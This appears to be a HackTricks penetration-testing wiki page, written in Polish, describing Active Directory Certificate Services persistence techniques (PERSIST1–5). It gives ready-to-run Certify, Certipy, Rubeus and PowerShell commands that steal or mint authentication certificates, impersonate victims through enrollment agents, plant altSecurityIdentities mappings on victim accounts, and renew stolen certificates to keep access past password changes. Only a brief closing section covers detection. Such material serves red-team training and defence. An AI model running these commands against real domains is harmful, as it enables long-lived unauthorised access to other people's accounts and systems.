# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**To jest krótkie podsumowanie rozdziałów o persistence kont z niesamowitych badań z [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Zrozumienie kradzieży poświadczeń aktywnego użytkownika za pomocą certyfikatów – PERSIST1

W scenariuszu, w którym użytkownik może zażądać certyfikatu umożliwiającego uwierzytelnianie domenowe, atakujący ma możliwość zażądania i kradzieży tego certyfikatu, aby utrzymać persistence w sieci. Domyślnie szablon `User` w Active Directory pozwala na takie żądania, choć czasami może być wyłączony.

Używając [Certify](https://github.com/GhostPack/Certify) lub [Certipy](https://github.com/ly4k/Certipy), możesz wyszukać włączone szablony, które pozwalają na client authentication, a następnie zażądać jednego:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Newer Certify 2.0 syntax with filtering to enabled client-auth templates
Certify.exe enum-templates --filter-enabled --filter-client-auth --hide-admins

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
Siła certyfikatu polega na jego zdolności do uwierzytelniania się jako użytkownik, do którego należy, niezależnie od zmian hasła, o ile certyfikat pozostaje ważny.

Możesz przekonwertować PEM do PFX i użyć go do uzyskania TGT:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Note: W połączeniu z innymi technikami (zobacz sekcje THEFT), uwierzytelnianie oparte na certyfikatach pozwala na trwały dostęp bez dotykania LSASS, a nawet z niewyższonych kontekstów.

## Uzyskiwanie trwałości maszyny za pomocą certyfikatów - PERSIST2

Jeśli atakujący ma podwyższone uprawnienia na hoście, może zarejestrować konto maszyny skompromitowanego systemu do certyfikatu przy użyciu domyślnego szablonu `Machine`. Uwierzytelnianie jako maszyna umożliwia S4U2Self dla lokalnych usług i może zapewnić trwałą persistence hosta:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Rozszerzanie persistence przez odnowienie certificate - PERSIST3

Nadużywanie okresów ważności i odnowienia szablonów certificate pozwala attackerowi utrzymać długotrwały dostęp. Jeśli posiadasz wcześniej wydany certificate i jego private key, możesz odnowić go przed wygaśnięciem, aby uzyskać nowy, długowieczny credential bez pozostawiania dodatkowych artefaktów request powiązanych z oryginalnym principal.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Operacyjna wskazówka: Śledź okresy ważności przechwyconych przez atakującego plików PFX i odnawiaj je odpowiednio wcześnie. Odnowienie może też spowodować, że zaktualizowane certyfikaty będą zawierać nowoczesne rozszerzenie mapowania SID, dzięki czemu pozostaną użyteczne przy bardziej rygorystycznych regułach mapowania na DC (patrz następna sekcja).

## Wstawianie jawnych mapowań certyfikatów (altSecurityIdentities) – PERSIST4

Jeśli możesz zapisywać do atrybutu `altSecurityIdentities` konta docelowego, możesz jawnie zmapować certyfikat kontrolowany przez atakującego do tego konta. To utrzymuje się mimo zmian hasła i, przy użyciu silnych formatów mapowania, pozostaje funkcjonalne przy nowoczesnym egzekwowaniu przez DC.

Przepływ na wysokim poziomie:

1. Uzyskaj lub wystaw certyfikat do uwierzytelniania klienta, którym zarządzasz (np. zarejestruj szablon `User` jako siebie).
2. Wyodrębnij z certyfikatu silny identyfikator (Issuer+Serial, SKI lub SHA1-PublicKey).
3. Dodaj jawne mapowanie w `altSecurityIdentities` głównego obiektu ofiary, używając tego identyfikatora.
4. Uwierzytelnij się swoim certyfikatem; DC zmapuje go do ofiary przez jawne mapowanie.

Przykład (PowerShell) z użyciem silnego mapowania Issuer+Serial:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Następnie uwierzytelnij się za pomocą swojego PFX. Certipy uzyska TGT bezpośrednio:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Budowanie silnych mapowań `altSecurityIdentities`

W praktyce mapowania **Issuer+Serial** i **SKI** są najłatwiejszymi silnymi formatami do zbudowania na podstawie certyfikatu znajdującego się w rękach atakującego. Ma to znaczenie po **11 lutego 2025**, kiedy DCs domyślnie przechodzą na **Full Enforcement** i słabe mapowania przestają być niezawodne.
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Notes
- Use strong mapping types only: `X509IssuerSerialNumber`, `X509SKI`, or `X509SHA1PublicKey`. Słabe formaty (Subject/Issuer, Subject-only, RFC822 email) są przestarzałe i mogą być blokowane przez politykę DC.
- Mapowanie działa zarówno na obiektach **user**, jak i **computer**, więc uprawnienie do zapisu `altSecurityIdentities` konta komputera wystarcza, aby utrzymać persystencję jako ta maszyna.
- Łańcuch certyfikatu musi budować się do root zaufanego przez DC. Enterprise CA w NTAuth są zazwyczaj zaufane; w niektórych środowiskach zaufane są też public CA.
- Uwierzytelnianie Schannel pozostaje użyteczne do persystencji nawet wtedy, gdy PKINIT zawodzi, ponieważ DC nie ma EKU Smart Card Logon albo zwraca `KDC_ERR_PADATA_TYPE_NOSUPP`.

#### 2025+ `Issuer/SID` explicit mappings

Na kontrolerach domeny **Windows Server 2022+** załatanych aktualizacją bezpieczeństwa z **9 września 2025**, Microsoft dodał kolejny silny format explicit mapping, który jest atrakcyjny do persystencji, ponieważ przetrwa ponowne wydanie certyfikatu z tego samego CA:
```powershell
# Same issuer formatting rules as Issuer+Serial
$Issuer = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SID    = 'S-1-5-21-1111111111-2222222222-3333333333-1105'
$Map    = "X509:<I>$Issuer<SID>$SID"
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Operationalnie różni się to od starszych strong formats:
- `Issuer+Serial` przypina **jeden konkretny certificate**.
- `SKI` / `SHA1-PUKEY` przypina **jedną parę kluczy**.
- `Issuer/SID` przypina **wydający CA + docelowy SID**, więc odnowione lub ponownie wystawione certificates z tego samego CA nadal działają bez przepisywania `altSecurityIdentities`.

Wymagania i zastrzeżenia
- Certificate przedstawiony do logon musi faktycznie zawierać docelowy account SID w SID security extension.
- Ten format nie pomaga w przypadku `ESC9` / `ESC16` style certificates, które pomijają SID extension; w takich przypadkach wróć do `Issuer+Serial`, `SKI` lub `SHA1-PUKEY`.

Więcej o weak explicit mappings i attack paths znajdziesz tutaj:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent as Persistence – PERSIST5

Jeśli zdobędziesz valid Certificate Request Agent/Enrollment Agent certificate, możesz mintować nowe logon-capable certificates w imieniu users wedle uznania i trzymać agent PFX offline jako persistence token. Abuse workflow:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Unieważnienie certyfikatu agenta lub uprawnień szablonu jest wymagane, aby usunąć tę persistence.

Uwagi operacyjne
- Nowoczesne wersje `Certipy` obsługują zarówno `-on-behalf-of`, jak i `-renew`, więc atakujący posiadający Enrollment Agent PFX może wystawiać, a później odnawiać certyfikaty leaf bez ponownego kontaktu z oryginalnym kontem docelowym.
- Jeśli pobranie TGT oparte na PKINIT nie jest możliwe, wynikowy certyfikat on-behalf-of nadal może być używany do uwierzytelniania Schannel za pomocą `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.

## Using Persisted Certificates When PKINIT Fails

Jeśli DC nie ma certyfikatu obsługującego Smart Card Logon, logowanie certyfikatem przez PKINIT może zakończyć się błędem `KDC_ERR_PADATA_TYPE_NOSUPP`. To **nie** unieważnia tej primitive persistence: ten sam PFX często nadal nadaje się do dostępu LDAP uwierzytelnianego przez Schannel.
```bash
# LDAPS / Schannel shell as the mapped principal
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell

# LDAP StartTLS fallback if 636 is filtered but 389/TLS is reachable
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell -ldap-scheme ldap -ldap-port 389
```
Jest to szczególnie przydatne po PERSIST4/PERSIST5, ponieważ możesz dalej działać z Linux/macOS i łączyć inne akcje persistence w katalogu, takie jak wrzucanie [shadow credentials](../acl-persistence-abuse/shadow-credentials.md) lub edycja zapisywalnych atrybutów delegacji.

## 2025 Strong Certificate Mapping Enforcement: Wpływ na persistence

Microsoft KB5014754 wprowadził Strong Certificate Mapping Enforcement na domain controllers. Od **11 lutego 2025** DC domyślnie używają **Full Enforcement** dla słabych/niejednoznacznych mapowań, a od aktualizacji bezpieczeństwa z **9 września 2025** załatane DC nie wspierają już starego fallbacku w trybie Compatibility. Praktyczne konsekwencje:

- Certyfikaty sprzed 2022 roku, które nie mają rozszerzenia mapowania SID, mogą nie przejść implicit mapping, gdy DC są w Full Enforcement. Atakujący mogą utrzymać dostęp albo przez odnowienie certyfikatów przez AD CS (aby uzyskać rozszerzenie SID), albo przez dodanie silnego jawnego mapowania w `altSecurityIdentities` (PERSIST4).
- Jawne mapowania używające silnych formatów (`Issuer+Serial`, `SKI`, `SHA1-PUKEY`, a na nowoczesnych DC także `Issuer/SID`) nadal działają. Słabe formaty (Issuer/Subject, Subject-only, RFC822) mogą być blokowane i nie powinny być używane do persistence.
- Jeśli słabe mapowania nadal wydają się działać, załóż, że trafiłeś na niezałatany lub inaczej skonfigurowany DC, a nie na wiarygodną długoterminową ścieżkę persistence.
- Ścieżki wystawiania w stylu `ESC9` / `ESC16`, które wyłączają rozszerzenie SID, sprawiają, że `Issuer/SID` staje się bezużyteczne, więc praktyczną opcją persistence jest wtedy fallback do silnych mapowań albo odnowienie przez normalny template.

Administratorzy powinni monitorować i alertować o:
- Zmianach w `altSecurityIdentities` oraz wystawianiu/odnawianiu certyfikatów Enrollment Agent i User.
- Logach wydawania CA dla żądań on-behalf-of i nietypowych wzorców odnowień.

## References

- [Microsoft Support – KB5014754: Certificate-based authentication changes on Windows domain controllers](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [GhostPack/Certify Wiki – Account Persistence Techniques](https://github.com/GhostPack/Certify/wiki/2-%E2%80%90-Account-Persistence-Techniques)
- [Certipy Wiki – Command Reference](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [Almond Offensive Security – Authenticating with certificates when PKINIT is not supported](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
- [Microsoft Community Hub – Introducing a new Issuer/SID AltSecID](https://techcommunity.microsoft.com/blog/publicsectorblog/introducing-a-new-issuersid-altsecid/4454231)

{{#include ../../../banners/hacktricks-training.md}}
